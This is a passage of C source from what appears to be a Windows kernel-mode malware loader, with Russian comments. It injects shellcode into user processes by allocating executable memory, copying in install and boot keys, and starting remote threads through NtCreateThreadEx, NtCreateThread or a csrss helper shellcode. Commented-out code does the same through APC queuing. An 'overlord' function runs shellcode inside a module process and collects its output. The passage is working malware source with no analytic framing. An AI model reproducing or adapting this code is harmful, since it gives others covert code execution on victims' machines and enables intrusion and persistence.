            r3ScExportFinderSize = sizeof(sc_export_finder_x64);
        }
        else
#endif // _WIN64
        {
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pShellcodeBlock, sizeof(shellcode_block_t), NonPagedPool);
            r3ScKernel32FinderSize = sizeof(sc_ntdll_finder_x32);
            r3ScExportFinderSize = sizeof(sc_export_finder_x32);
        }

        // Выравниваем размер шеллкода до кратного странице.
        realScSize = ALIGN_UP_BY(scSize, pageSize);
#ifdef _WIN64
        if (isWow64 == 0) {
            realDataSize = ALIGN_UP_BY(sizeof(shellcode64_block_t) + inDataSize - 1, pageSize);
        }
        else
#endif // _WIN64
        {
            realDataSize = ALIGN_UP_BY(sizeof(shellcode_block_t) + inDataSize - 1, pageSize);
        }
        realScKernel32FinderSize = ALIGN_UP_BY(r3ScKernel32FinderSize, pageSize);
        realScExportFinderSize = ALIGN_UP_BY(r3ScExportFinderSize, pageSize);
        realSize = realScSize + realDataSize + realScKernel32FinderSize + realScExportFinderSize;

        // Выделяем память для шеллкода и данных
        ntStatus = pGlobalBlock->pCommonBlock->fnNtAllocateVirtualMemory(hProcess, &pUserMemory, 0, &realSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (ntStatus != STATUS_SUCCESS) {
            break;
        }

        // Подготоавливаем данные для инжекта.
        pUserData = pUserMemory + realSize - realDataSize;

        // Копируем шеллкод.
        MEMCPY(pUserMemory, pSc, scSize);

#ifdef _WIN64
        if (isWow64 == 0) {
            MEMCPY(pShellcode64Block->installKey, pGlobalBlock->pCommonBlock->pConfig->installKey, sizeof(pShellcode64Block->installKey));
            MEMCPY(pShellcode64Block->bootKey, pGlobalBlock->pCommonBlock->bootKey, sizeof(pShellcode64Block->bootKey));
            MEMCPY(pShellcode64Block->fsKey, pGlobalBlock->pCommonBlock->fsKey, sizeof(pShellcode64Block->fsKey));
            pShellcode64Block->osMajorVersion = (uint16_t)pGlobalBlock->osMajorVersion;
            pShellcode64Block->osMinorVersion = (uint16_t)pGlobalBlock->osMinorVersion;
            pShellcode64Block->osSPMajorVersion = (uint16_t)pGlobalBlock->osSPMajorVersion;
            pShellcode64Block->osSPMinorVersion = (uint16_t)pGlobalBlock->osSPMinorVersion;
            pShellcode64Block->fnGetNtDLLBase = (FnGetNtDLLBase)(pUserMemory + realScSize);
            pShellcode64Block->fnGetFuncAddress = (FnGetFuncAddress)(pUserMemory + realScSize + realScKernel32FinderSize);
        }
        else
#endif // _WIN64
        {
            MEMCPY(pShellcodeBlock->installKey, pGlobalBlock->pCommonBlock->pConfig->installKey, sizeof(pShellcodeBlock->installKey));
            MEMCPY(pShellcodeBlock->bootKey, pGlobalBlock->pCommonBlock->bootKey, sizeof(pShellcodeBlock->bootKey));
            MEMCPY(pShellcodeBlock->fsKey, pGlobalBlock->pCommonBlock->fsKey, sizeof(pShellcodeBlock->fsKey));
            pShellcodeBlock->osMajorVersion = (uint16_t)pGlobalBlock->osMajorVersion;
            pShellcodeBlock->osMinorVersion = (uint16_t)pGlobalBlock->osMinorVersion;
            pShellcodeBlock->osSPMajorVersion = (uint16_t)pGlobalBlock->osSPMajorVersion;
            pShellcodeBlock->osSPMinorVersion = (uint16_t)pGlobalBlock->osSPMinorVersion;
            pShellcodeBlock->fnGetNtDLLBase = (uint32_t)(pUserMemory + realScSize);
            pShellcodeBlock->fnGetFuncAddress = (uint32_t)(pUserMemory + realScSize + realScKernel32FinderSize);
        }

#ifdef _WIN64
        if (isWow64 == 0) {
            // Копируем шеллкод.
            MEMCPY(pShellcode64Block->fnGetNtDLLBase, pGlobalBlock->pLauncherBlock->scNtDLLFinder64, sizeof(sc_ntdll_finder_x64));
            // Копируем шеллкод.
            MEMCPY(pShellcode64Block->fnGetFuncAddress, pGlobalBlock->pLauncherBlock->scExportFinder64, sizeof(sc_export_finder_x64));

            MEMCPY(pUserData, pShellcode64Block, sizeof(shellcode64_block_t));
            MEMCPY(pUserData + sizeof(shellcode64_block_t) - 1, inData, inDataSize);
        }
        else
#endif // _WIN64
        {
            // Копируем шеллкод.
            MEMCPY((pvoid_t)pShellcodeBlock->fnGetNtDLLBase, pGlobalBlock->pLauncherBlock->scNtDLLFinder32, sizeof(sc_ntdll_finder_x32));
            // Копируем шеллкод.
            MEMCPY((pvoid_t)pShellcodeBlock->fnGetFuncAddress, pGlobalBlock->pLauncherBlock->scExportFinder32, sizeof(sc_export_finder_x32));

            MEMCPY(pUserData, pShellcodeBlock, sizeof(shellcode_block_t));
            MEMCPY(pUserData + sizeof(shellcode_block_t) - 1, inData, inDataSize);
        }

#if _WIN64
        pResult = ((isWow64 == 0) ? &((pshellcode64_block_t)pUserData)->result : &((pshellcode_block_t)pUserData)->result);
#else
        pResult = &((pshellcode_block_t)pUserData)->result;
#endif // _WIN64


        //         // Ищем поток для APC...
        //         startThread = threadList = ((LIST_ENTRY*)((uint8_t*)(pep) + pGlobalBlock->pLauncherBlock->dwThreadListHead))->Flink;
        // 
        //         if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(startThread)) {
        //             do {
        //                 pet = (PETHREAD)((uint8_t*)threadList - pGlobalBlock->pLauncherBlock->dwThreadListEntry);
        //                 if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pet)) {
        //                     threadStartAddress = *(uint8_t**)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwWin32StartAddress);
        //                     wr = *(uint8_t*)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwWaitReason);
        //                     threadState = *(uint8_t*)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwThreadState);
        //                     if (!pGlobalBlock->pCommonBlock->fnPsIsSystemThread(pet) &&
        //                         (threadStartAddress >= pGlobalBlock->pLauncherBlock->ntdllBase) && (threadStartAddress < pGlobalBlock->pLauncherBlock->ntdllBase + pGlobalBlock->pLauncherBlock->ntdllSize) &&
        //                         (threadState == Waiting && (wr == DelayExecution || wr == WrDelayExecution))) {
        //                         isOK = TRUE;
        //                         break;
        //                     }
        //                 }
        //                 threadList = threadList->Flink;
        //             } while (threadList != NULL && threadList != startThread);
        //         }
        //         if (!isOK) {
        //             startThread = threadList = ((LIST_ENTRY*)((uint8_t*)(pep) + pGlobalBlock->pLauncherBlock->dwThreadListHead))->Flink;
        //             if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(startThread)) {
        //                 do {
        //                     pet = (PETHREAD)((uint8_t*)threadList - pGlobalBlock->pLauncherBlock->dwThreadListEntry);
        //                     if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pet)) {
        //                         wr = *(uint8_t*)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwWaitReason);
        //                         threadState = *(uint8_t*)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwThreadState);
        //                         if (!pGlobalBlock->pCommonBlock->fnPsIsSystemThread(pet) && ((threadState == Waiting && (wr == Executive || wr == DelayExecution || wr == WrDelayExecution)))) {
        //                             isOK = TRUE;
        //                             break;
        //                         }
        //                     }
        //                     threadList = threadList->Flink;
        //                 } while (threadList != NULL && threadList != startThread);
        //             }
        //         }

        //         if (isOK) {
        //             // Инжектим шеллкод.
        //             pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pApc, sizeof(KAPC), NonPagedPool);
        // 
        //             pGlobalBlock->pCommonBlock->fnKeInitializeApc(pApc, (PKTHREAD)pet, OriginalApcEnvironment, pGlobalBlock->pLauncherBlock->fnapc_kernel_routine, NULL, (PKNORMAL_ROUTINE)pUserMemory, UserMode, pUserData);
        // 
        //             // Делаем поток алертабельным.
        //             *((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwAlertable) |= pGlobalBlock->pLauncherBlock->dbAlertableMask;
        //             ((KAPC_STATE*)((uint8_t*)pet + pGlobalBlock->pLauncherBlock->dwApcQueueable))->UserApcPending = 1;
        // 
        //             isOK = pGlobalBlock->pCommonBlock->fnKeInsertQueueApc(pApc, NULL, NULL, 0);
        // 
        //             if (!isOK) {
        //                 pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pApc, ALLOCATOR_TAG);
        //                 break;
        //             }
        //         }
        //         else {
        if (pGlobalBlock->osMajorVersion > 5) {
            NTCREATETHREADEXBUFFER ntBuffer;
            void* hThread = NULL;
            uintptr_t dw0[1];
            uintptr_t dw1[2];
            //uintptr_t dw0[4], dw1[4];

            __stosb((uint8_t*)&ntBuffer, 0, sizeof(NTCREATETHREADEXBUFFER));
            ntBuffer.Size = sizeof(NTCREATETHREADEXBUFFER)/* - sizeof(ntBuffer.reserved)*/;
            __stosb((uint8_t*)dw0, 0, sizeof(dw0));
            __stosb((uint8_t*)dw1, 0, sizeof(dw1));
// #ifdef _WIN64
//             ntBuffer.Unknown1 = 0x10006;
// #else
            ntBuffer.Unknown1 = 0x10003;
// #endif // W_IN64
            ntBuffer.Unknown2 = sizeof(uintptr_t) * 2;
            ntBuffer.Unknown3 = dw1;
// #ifdef _WIN64
//             ntBuffer.Unknown5 = 0x10008;
// #else
            ntBuffer.Unknown5 = 0x10004;
// #endif // _WIN64
            ntBuffer.Unknown6 = sizeof(uintptr_t);
            ntBuffer.Unknown7 = dw0;

            if ((ntStatus = pGlobalBlock->pLauncherBlock->fnNtCreateThreadEx(&hThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (void*)pUserMemory, (void*)pUserData, FALSE,
                0L, 0L, 0L, &ntBuffer)) != STATUS_SUCCESS) {
                break;
            }
        }
        else {
            PEPROCESS pCsRssPEP;
            PUCHAR stackBase = NULL;
            SIZE_T maximumStackSize;
            SIZE_T committedStackSize;
            size_t/*ULONG*/ regionSize;
            INITIAL_TEB initialTeb;
            SIZE_T Zero = 0;
            CONTEXT ctx;
            CLIENT_ID clientId;
            HANDLE hThread = NULL;
            OBJECT_ATTRIBUTES objAttrs;
            BOOLEAN isGuardPage;
            ULONG OldProtect;

            // Если нужный поток не удалось найти, нам надо сделать инжект из родительского процесса одним из документированных способов.

            maximumStackSize = pGlobalBlock->systemInfo.AllocationGranularity;
            committedStackSize = pGlobalBlock->systemInfo.PageSize;

            if (committedStackSize >= maximumStackSize) {
                maximumStackSize = ALIGN_UP_BY(committedStackSize, 1024*1024);
            }

            maximumStackSize = ALIGN_UP_BY(maximumStackSize, pGlobalBlock->systemInfo.AllocationGranularity);

            pGlobalBlock->pCommonBlock->fnmemset(&initialTeb, 0, sizeof(initialTeb));
            pGlobalBlock->pCommonBlock->fnmemset(&ctx, 0, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_FULL;

            do {
                // Allocate stack
                ntStatus = pGlobalBlock->pCommonBlock->fnNtAllocateVirtualMemory(hProcess, &stackBase, 0, &maximumStackSize, MEM_RESERVE, PAGE_READWRITE);
                if (!NT_SUCCESS(ntStatus)) {
                    break;
                }

                initialTeb.StackAllocationBase = stackBase;
                initialTeb.StackBase = stackBase + maximumStackSize;

                stackBase += maximumStackSize - committedStackSize;
                if (maximumStackSize > committedStackSize) {
                    stackBase -= pGlobalBlock->systemInfo.PageSize;
                    committedStackSize += pGlobalBlock->systemInfo.PageSize;
                    isGuardPage = TRUE;
                }
                else {
                    isGuardPage = FALSE;
                }

                ntStatus = pGlobalBlock->pCommonBlock->fnNtAllocateVirtualMemory(hProcess, &stackBase, 0, &committedStackSize, MEM_COMMIT, PAGE_READWRITE);
                initialTeb.StackLimit = stackBase;

                if (isGuardPage) {
                    regionSize =  pGlobalBlock->systemInfo.PageSize;
                    ntStatus = pGlobalBlock->pLauncherBlock->fnNtProtectVirtualMemory(hProcess, &stackBase, &regionSize, PAGE_GUARD | PAGE_READWRITE, &OldProtect);

                    if (!NT_SUCCESS(ntStatus)) {
                        break;
                    }
                    initialTeb.StackLimit = (PVOID)((PUCHAR)initialTeb.StackLimit - regionSize);
                }

                // Save pointer on the stack. 
#ifdef _WIN64
                ctx.Rsp = (ULONG64)((PUCHAR)initialTeb.StackBase - 40/*2*sizeof(PVOID)*/);
                // *(PVOID*)(ctx.Rsp + sizeof(PVOID)) = params;
#else
                ctx.Esp = (ULONG)((PUCHAR)initialTeb.StackBase - 2*sizeof(PVOID));
                *(PVOID*)(ctx.Esp + sizeof(PVOID)) = pUserData;
#endif // _AMD64_

                ctx.SegCs = 0x18;
                ctx.SegDs = 0x20;
                ctx.SegEs = 0x20;
                ctx.SegSs = 0x20;
                ctx.SegFs = 0x38;
                ctx.EFlags = 0x200;
#ifdef _WIN64
                ctx.Rcx = (ULONG64)pUserData;
                ctx.Rip = (ULONG64)
#else
                ctx.Eip = (ULONG)
#endif // _AMD64_
                    pUserMemory;

                pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);

                // Create thread
                InitializeObjectAttributes(&objAttrs, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                ntStatus = pGlobalBlock->pLauncherBlock->fnNtCreateThread(&hThread, THREAD_ALL_ACCESS, &objAttrs, hProcess, &clientId, &ctx, &initialTeb, TRUE);

                if (!NT_SUCCESS(ntStatus)) {
                    pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);
                    break;
                }

                result = SC_RESULT_OK;
                if (!isNative) {
                    uint8_t* csrssSc;
                    uint32_t csrssScSize;
                    LARGE_INTEGER csrssTimeout;
                    pCsRssPEP = pGlobalBlock->pLauncherBlock->fnlauncher_find_user_thread_by_hash(CSRSS_EXE, NULL, NULL);

#ifdef _WIN64
                    if (isWow64 == 0) {
                        csrssSc = (uint8_t*)pGlobalBlock->pLauncherBlock->scTransitLauncher64;
                        csrssScSize = sizeof(sc_transit_launcher_x64);
                    }
                    else
#endif // _WIN64
                    {
                        csrssSc = (uint8_t*)pGlobalBlock->pLauncherBlock->scTransitLauncher32;
                        csrssScSize = sizeof(sc_transit_launcher_x32);
                    }

                    csrssTimeout.QuadPart = -70000000I64;

                    result = pGlobalBlock->pLauncherBlock->fnlauncher_execute_shellcode(pCsRssPEP, csrssSc, csrssScSize, (uint8_t*)&clientId, sizeof(clientId), NULL, NULL, &csrssTimeout, TRUE);
                }
                if (result == SC_RESULT_OK) {
                    ntStatus = pGlobalBlock->pLauncherBlock->fnNtResumeThread(hThread, NULL);
                }
                result = 0;
                pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);

                // Ждём 70 секунд максимум.
                delay.QuadPart = -700000000I64;
                ntStatus = pGlobalBlock->pCommonBlock->fnZwWaitForSingleObject(hThread, FALSE, &delay);
            } while (FALSE);

            if (hThread != NULL) {
                pGlobalBlock->pCommonBlock->fnZwClose(hThread);
            }

            pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &initialTeb.StackAllocationBase, &Zero, MEM_RELEASE);
        }
//         }

        delay.QuadPart = -5000000I64; // пол секунды.
        do {
            pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);

            if (!(isGoodMem = pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pResult))) {
                break;
            }

            pTimeOut->QuadPart += 5000000I64;
        } while ((*pResult == 0) && pTimeOut->QuadPart < 0);

        if (!isGoodMem) {
            // В данном случае, скорее всего закрешился процесс.
            result = SC_RESULT_CRASH;
            pUserMemory = NULL;
            break;
        }

        result |= *pResult;

        if (result == SC_RESULT_OK) {
#ifdef _WIN64
            if (isWow64 == 0) {
                if (pOutData != NULL) {
                    *pOutData = ((pshellcode64_block_t)pUserData)->pOutData;
                }
                if (pOutDataSize != NULL) {
                    *pOutDataSize = ((pshellcode64_block_t)pUserData)->outDataSize;
                }
            }
            else
#endif // _WIN64
            {
                if (pOutData != NULL) {
                    *pOutData = ((pshellcode_block_t)pUserData)->pOutData;
                }
                if (pOutDataSize != NULL) {
                    *pOutDataSize = ((pshellcode_block_t)pUserData)->outDataSize;
                }
            }
        }
    } while (0);

    if (isGoodMem && pUserMemory != NULL) {
        pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &pUserMemory, &realSize, MEM_RELEASE);
    }

    pGlobalBlock->pCommonBlock->fnZwClose(hProcess); 
    pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);

#ifdef _WIN64
    if (pShellcode64Block != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pShellcode64Block, LOADER_TAG);
    }
    else
#endif
    if (pShellcodeBlock != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pShellcodeBlock, LOADER_TAG);
    }

    return result;
}

bool_t launcher_overlord_request(overlord_request_id_e orid, uint8_t* inData, uint32_t inSize, uint8_t** pOutData, uint32_t* pOutSize)
{
    KAPC_STATE apcState;
    HANDLE hProcess = NULL;
    LARGE_INTEGER maxTimeout; // Время ожидания ответа от Оверлорда (для разных запросов оно может быть разным).
    uint32_t result = SC_RESULT_BAD;
    poverlord_request_info_t pOri;
    pzfile_list_entry_t pOverlord;
    uint8_t* outData = NULL;
    uint32_t totalInSize;
    size_t outSize = 0;
    USE_GLOBAL_BLOCK
// #ifdef _WIN64
//         __debugbreak();
// #else
//         __asm int 3
// #endif // _WIN64

    if (pGlobalBlock->pLauncherBlock->pOverlordZfileEntry != NULL && pGlobalBlock->pLauncherBlock->pOverlordZfileEntry->runtimeState == ZRUNTIME_FLAG_LOADED) {
        pOverlord = pGlobalBlock->pLauncherBlock->pOverlordZfileEntry;

        maxTimeout.QuadPart = -700000000I64;

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pOri, sizeof(overlord_request_info_t) + inSize, NonPagedPool);

        pOri->orid = orid;
        totalInSize = sizeof(overlord_request_info_t);
        if (inSize != 0) {
            totalInSize += inSize;
            pOri->inSize = inSize;
            __movsb(pOri->inData, inData, inSize);
        }
        pOri->moduleBase = pOverlord->dllBase;
        pOri->moduleSize = pOverlord->dllSize;
        //     if (orid == ORID_NETWORK_INFO || orid == ORID_HIPS_INFO) {
        //         
        //     }
// #ifdef _WIN64
//         __debugbreak();
// #else
//         __asm int 3
// #endif // _WIN64
#ifdef _WIN64
        result = pGlobalBlock->pLauncherBlock->fnlauncher_execute_shellcode(pOverlord->pEprocess, pGlobalBlock->pLauncherBlock->scOverlord64, pGlobalBlock->pLauncherBlock->scOverlordSize, (uint8_t*)pOri, totalInSize, &outData, (uint32_t*)&outSize, &maxTimeout, FALSE);
#else
        result = pGlobalBlock->pLauncherBlock->fnlauncher_execute_shellcode(pOverlord->pEprocess, pGlobalBlock->pLauncherBlock->scOverlord32, pGlobalBlock->pLauncherBlock->scOverlordSize, (uint8_t*)pOri, totalInSize, &outData, (uint32_t*)&outSize, &maxTimeout, FALSE);
#endif // _WIN64

        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pOri, LOADER_TAG);

        if (result == SC_RESULT_OK) {
            pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pOverlord->pEprocess, &apcState);

            // Получаем описатель процесса.
            pGlobalBlock->pCommonBlock->fnObOpenObjectByPointer(pOverlord->pEprocess, OBJ_KERNEL_HANDLE, NULL, SYNCHRONIZE, *pGlobalBlock->pCommonBlock->pPsProcessType, KernelMode, &hProcess);

            if (outData != NULL) {
                if (pOutData != NULL) {
                    *pOutSize = outSize;
                    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, pOutData, outSize, NonPagedPool);
                    __movsb(*pOutData, outData, outSize);
                }

                if (hProcess != NULL) {
                    pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &outData, &outSize, MEM_RELEASE);
                }
            }

            pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);
        }
    }

    return (result == SC_RESULT_OK);
}

void launcher_shutdown_routine()
{
    KIRQL x;
    bool_t ret;
    pzfile_list_entry_t pFileListHead;
    pzfile_list_entry_t pFileListItem = NULL;
    USE_GLOBAL_BLOCK

    // Удаляем функцию для (де)регистрации процессов в системе.
    pGlobalBlock->pCommonBlock->fnPsSetCreateProcessNotifyRoutine(pGlobalBlock->pLauncherBlock->fnlauncher_create_process_notifier, TRUE);

    // Заверашем работу всех запущенных модулей.
    x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);

    // Пробегаемся по всему списку имеющихся активных модулей.
    pFileListHead = &pGlobalBlock->pLauncherBlock->runningListHead;
    pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
    while (pFileListItem != pFileListHead) {
        if (pFileListItem->runtimeState == ZRUNTIME_FLAG_NEW) {
            InterlockedExchange(&pFileListItem->runtimeState, ZRUNTIME_FLAG_ZOMBI);
        }
        else if (pFileListItem->runtimeState == ZRUNTIME_FLAG_RELOAD || pFileListItem->runtimeState == ZRUNTIME_FLAG_LOADED) {
            InterlockedExchange(&pFileListItem->runtimeState, ZRUNTIME_FLAG_UNLOAD);
        }

        pFileListItem = (pzfile_list_entry_t)pFileListItem->Flink;
    }
    pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);

    // Выгружаем файлы.
    pGlobalBlock->pLauncherBlock->fnlauncher_process_modules();

    // Пробегаемся по всему списку инициализирующих модулей и удаляем.
    pFileListHead = &pGlobalBlock->pLauncherBlock->baseListHead;
    pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
    while (pFileListItem != pFileListHead) {
        pzfile_list_entry_t pTmpItem;
        pTmpItem = (pzfile_list_entry_t)((PLIST_ENTRY)pFileListItem)->Blink;
        ret = pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pFileListItem);

        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileListItem, LOADER_TAG);

        if (ret) {
            break;
        }

        pFileListItem = (pzfile_list_entry_t)pTmpItem->Flink;
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pLauncherBlock->pFilesHashTable, LOADER_TAG);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pLauncherBlock, LOADER_TAG);
}
